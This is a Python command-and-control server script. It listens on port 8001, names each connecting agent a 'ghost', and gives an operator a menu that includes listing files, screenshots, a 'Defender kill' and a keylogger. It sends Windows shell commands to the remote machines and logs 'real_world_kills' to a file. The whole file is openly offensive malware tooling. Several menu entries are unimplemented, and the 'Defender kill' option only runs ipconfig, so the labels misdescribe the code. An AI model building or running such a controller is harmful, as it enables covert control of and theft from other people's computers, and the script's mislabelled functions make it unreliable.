#!/usr/bin/env python3
import socket
import threading
import json
import random
import time
import os  # <-- FIXED: was missing

PORT = 8001
REPORT_FILE = "real_world_kills.json"

def log_kill(reason, agent_id="unknown"):
    kill = {
        "agent_id": agent_id,
        "death_reason": reason,
        "timestamp": time.time()
    }
    with open(REPORT_FILE, "a") as f:
        f.write(json.dumps(kill) + "\n")
    print(f"[AI] Learned: {reason}")

def handle_client(conn, addr):
    agent_id = f"ghost_{random.randint(1000,9999)}"
    print(f"\n[C2] Agent {agent_id} connected from {addr[0]}")
    conn.send(b"HELLO\n")

    while True:
        try:
            data = conn.recv(1024).decode().strip()
            if not data:
                break
            print(f"[{agent_id}] {data}")

            print("\n" + "="*40)
            print("C2 MENU")
            print("="*40)
            print("1. List files")
            print("2. Screenshot")
            print("3. Kill notepad")
            print("4. LOUD (Defender kill)")
            print("5. Force report")
            print("6. Keylogger")
            print("0. Exit")
            print("="*40)
            choice = input("Choose: ")
            if choice == "0":
                conn.close()
                break
            elif choice == "1":
                conn.send(b"dir C:\\\n")
            elif choice == "4":
                conn.send(b"ipconfig /all > C:\\LOUD.txt\n")
                log_kill("Defender kill", agent_id)
            elif choice == "5":
                conn.send(b"report\n")
            else:
                conn.send(b"Unknown command\n")
        except:
            break

    conn.close()
    print(f"[C2] Agent {agent_id} disconnected")

def start_server():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT))
    s.listen(5)
    print(f"[C2] Listening on 0.0.0.0:{PORT}")

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()
